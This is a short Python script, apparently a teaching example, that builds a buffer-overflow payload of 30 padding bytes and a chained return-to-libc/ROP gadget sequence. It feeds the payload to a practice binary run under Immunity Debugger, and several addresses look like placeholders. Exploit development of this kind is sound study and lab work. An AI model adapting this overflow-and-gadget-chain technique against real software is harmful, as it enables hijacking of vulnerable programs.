#!/usr/bin/python
#Simple return to libc chained example of exploitation for a Windows 32 bit PE
#Author: Pepitoex123

import subprocess
import struct

def le(number):
	return struct.pack("<I",number)
gad0 = 0x75558888 # Pop ebp;ret
gad1 = 0x76222222 # add eax, 0x11223344; ret
gad2 = 0x75082238 # call [eax + 0x2244]; ret
gad2p1 = 0x11223344
gad2p2 = 0x33445566
param = "c:\\program files (x86)\\immmunity inc\\immunity debugger\\immunitydebugger.exe"
param += " bufferOverflow "
#Offset of 30 bytes
param += 30 * "A"
#gadget 0
param += le(gad0)
#gadget 1
param += le(gad1)
#gadget 2
param += le(gad2)
param += le(gad2p1)
param += le(gad2p2)

subprocess.call(param)
